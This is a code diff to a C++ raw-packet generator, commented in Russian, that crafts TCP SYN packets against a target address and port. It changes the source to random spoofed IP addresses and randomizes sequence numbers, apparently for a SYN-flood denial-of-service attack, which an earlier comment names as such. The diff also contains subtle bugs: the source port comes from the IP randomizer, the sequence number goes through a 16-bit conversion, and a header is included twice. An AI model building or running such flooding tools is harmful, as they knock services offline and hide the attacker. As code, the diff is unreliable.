@@ -1,7 +1,12 @@
 #include "packet.hpp"
 #include "../utils/checksum.hpp"
+#include <cstdint>
+#include <cstdlib>
 #include <cstring>          
 #include <iostream>
+#include <netinet/in.h>
+#include <random>
+#include <cstdlib>
 
 // Константы для сырого пакета
 const int IP_HEADER_LEN = 20; // 20 байт - стандартная длина IP-заголовка
@@ -58,26 +63,24 @@ void PacketGenerator::fill_ip_header(struct iphdr* ip_h) const {
     ip_h->ttl = 64; // Time to Live
     ip_h->protocol = IPPROTO_TCP; // TCP = 6
     ip_h->check = 0; // Будет рассчитана позже
-    
-    ip_h->saddr = inet_addr("127.0.0.1"); 
+   
+    ip_h->saddr=get_random_ip();
     ip_h->daddr = inet_addr(target_.ip.c_str()); 
 }
 
 // Вспомогательная функция: Заполнение TCP-заголовка
 void PacketGenerator::fill_tcp_header(struct tcphdr* tcp_h) const {
     // Порты
-    tcp_h->source = htons(54321); // Произвольный исходный порт (рандомизировать!)
+    tcp_h->source=htons(get_random_ip());
     tcp_h->dest = htons(target_.port); // Целевой порт в сетевом порядке
     
-    // Последовательности
-    tcp_h->seq = htonl(10000); // Sequence Number (можно рандомизировать)
+    tcp_h->seq=htons(get_random_seq());
     tcp_h->ack_seq = 0; // ACK = 0 для SYN-пакета
     
-    // Длина заголовка (Data Offset): 5 слов (20 байт)
     tcp_h->doff = 5;
     
-    // Флаги TCP (Ключевая часть атаки!)
-    tcp_h->syn = 1; // Устанавливаем флаг SYN (синхронизация)
+    // Флаги TCP
+    tcp_h->syn = 1;
     tcp_h->ack = 0;
     tcp_h->psh = 0;
     tcp_h->rst = 0;
@@ -86,4 +89,22 @@ void PacketGenerator::fill_tcp_header(struct tcphdr* tcp_h) const {
     tcp_h->window = htons(5840); // Размер окна
     tcp_h->check = 0; // Будет рассчитана позже
     tcp_h->urg_ptr = 0; // Указатель срочности
+
+}
+
+uint32_t PacketGenerator::get_random_ip() const{
+
+  uint32_t random_ip = (static_cast<uint32_t>(std::rand()) << 16) | static_cast<uint32_t>(std::rand());
+  return random_ip;
+}
+
+uint16_t PacketGenerator::get_random_port() const{
+  const int MIN_PORT = 1025;
+  const int MAX_PORT = 65535;
+
+  return static_cast<uint16_t>((std::rand() % (MAX_PORT - MIN_PORT + 1)) + MIN_PORT);
+}
+
+uint32_t PacketGenerator::get_random_seq() const {
+    return (static_cast<uint32_t>(std::rand()) << 16) | static_cast<uint32_t>(std::rand());
 }
